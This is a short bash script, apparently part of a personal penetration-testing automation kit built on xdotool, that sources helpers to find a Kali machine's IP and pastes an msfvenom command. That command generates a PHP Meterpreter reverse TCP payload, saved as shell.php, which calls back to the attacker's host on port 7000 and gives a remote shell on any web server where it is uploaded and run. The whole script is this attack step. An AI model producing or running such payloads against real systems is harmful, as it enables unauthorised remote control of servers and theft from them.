#!/bin/bash

"""
Create PHP file
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "msfvenom -p php/meterpreter_reverse_tcp LHOST=${KALI_IP} LPORT=7000 -f raw -o shell.php"
